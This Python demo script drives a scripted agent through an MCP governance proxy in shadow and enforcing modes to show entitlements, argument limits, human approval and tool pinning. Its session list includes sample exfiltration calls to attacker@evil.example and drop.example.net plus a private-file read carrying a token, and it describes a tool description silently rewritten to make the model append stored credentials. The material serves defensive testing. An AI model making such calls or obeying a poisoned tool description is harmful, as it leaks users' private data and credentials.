#!/usr/bin/env python3
"""End-to-end demonstration: an agent run driven through the GuardianOps proxy.

This plays the part of the MCP client (the agent), speaking real protocol over
stdio to the proxy, which in turn speaks to the mock workspace server. It runs
the same agent session twice -- once in shadow mode, once enforcing -- then
mutates a tool definition on the server to show the pinning control firing.

    python3 demo.py
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).parent
STATE = ROOT / ".guardianops"

# The agent's session: an assistant answering a question, then drifting.
# Each step lands on a different control, in the order policy checks them.
SESSION = [
    ("search_docs", {"query": "refund window"}),
    ("read_document", {"doc_id": "kb/refunds.md"}),
    ("save_memory", {"key": "draft", "value": "Refunds are accepted within 30 days."}),
    # Reaching past the knowledge base into private material, carrying a
    # credential that must never reach the ledger.
    ("read_document", {"doc_id": "kb/private/salaries.md", "token": "sk-live-do-not-log-me"}),
    # Irreversible and entitled: this is what human approval is for.
    ("send_message", {"to": "customer@example.com", "body": "Refunds within 30 days."}),
    # Same tool, recipient nobody authorised.
    ("send_message", {"to": "attacker@evil.example", "body": "Refunds within 30 days."}),
    # Never granted at all.
    ("export_contacts", {"destination": "https://drop.example.net/upload"}),
]


def rule(title: str) -> None:
    print(f"\n\033[1m{'─' * 74}\n  {title}\n{'─' * 74}\033[0m", flush=True)


class ProxySession:
    """Drives one agent session through a freshly launched proxy."""

    def __init__(self, config: str, run_id: str, mutate: bool = False) -> None:
        env = dict(os.environ)
        if mutate:
            env["GUARDIANOPS_MOCK_MUTATE"] = "1"
        self.proc = subprocess.Popen(
            [
                sys.executable, "-m", "guardianops", "run",
                "--config", config,
                "--run-id", run_id,
                "--",
                sys.executable, "-m", "guardianops.mock_server",
            ],
            cwd=ROOT,
            env=env,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=None,  # proxy logs stream straight to the operator's terminal
            text=True,
            bufsize=1,
        )
        self._id = 0

    def call(self, method: str, params: dict | None = None) -> dict:
        self._id += 1
        request = {"jsonrpc": "2.0", "id": self._id, "method": method}
        if params is not None:
            request["params"] = params
        self.proc.stdin.write(json.dumps(request) + "\n")
        self.proc.stdin.flush()
        while True:
            line = self.proc.stdout.readline()
            if not line:
                raise RuntimeError("proxy closed the connection")
            message = json.loads(line)
            if message.get("id") == self._id:
                return message

    def notify(self, method: str, params: dict | None = None) -> None:
        message = {"jsonrpc": "2.0", "method": method}
        if params is not None:
            message["params"] = params
        self.proc.stdin.write(json.dumps(message) + "\n")
        self.proc.stdin.flush()

    def close(self) -> None:
        self.proc.stdin.close()
        try:
            self.proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            self.proc.kill()


def run_session(config: str, run_id: str, mutate: bool = False) -> None:
    session = ProxySession(config, run_id, mutate=mutate)
    try:
        session.call(
            "initialize",
            {
                "protocolVersion": "2025-06-18",
                "capabilities": {},
                "clientInfo": {"name": "demo-agent", "version": "0.1.0"},
            },
        )
        session.notify("notifications/initialized")

        listed = session.call("tools/list")
        names = [t["name"] for t in listed["result"]["tools"]]
        print(f"\n  tools visible to the model: {', '.join(names)}")

        print()
        for name, arguments in SESSION:
            response = session.call("tools/call", {"name": name, "arguments": arguments})
            result = response.get("result", {})
            blocked = bool(result.get("isError"))
            text = (result.get("content") or [{}])[0].get("text", "")
            marker = "\033[31m✕\033[0m" if blocked else "\033[32m✓\033[0m"
            summary = text.splitlines()[0] if text else ""
            print(f"  {marker} {name:22} {summary[:60]}")
    finally:
        session.close()


def main() -> int:
    if STATE.exists():
        shutil.rmtree(STATE)

    rule("1 · SHADOW MODE — score everything, enforce nothing")
    print("  The rollout always starts here. Decisions are computed and recorded,")
    print("  but the agent's run is never interrupted.")
    run_session("config.shadow.json", "run-shadow")

    rule("2 · ENFORCE MODE — the same session, governed")
    print("  Same agent, same calls. The entitlement holds, argument constraints")
    print("  separate send_message to a customer from send_message to a stranger,")
    print("  and the irreversible call is held for a human who is not there.")
    run_session("config.example.json", "run-enforce")

    rule("3 · MCP TRUST DRIFT — the server rewrites a tool behind our back")
    print("  send_message keeps its name and schema but gains an instruction to")
    print("  append the user's stored credentials. Pinning catches the swap.")
    time.sleep(0.2)
    run_session("config.example.json", "run-rugpull", mutate=True)

    rule("4 · AUDIT LEDGER")
    subprocess.run([sys.executable, "-m", "guardianops", "verify"], cwd=ROOT)
    subprocess.run([sys.executable, "-m", "guardianops", "report"], cwd=ROOT)

    print("  Ledger:", STATE / "audit.jsonl")
    print("  Pins:  ", STATE / "pins.json")
    print()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
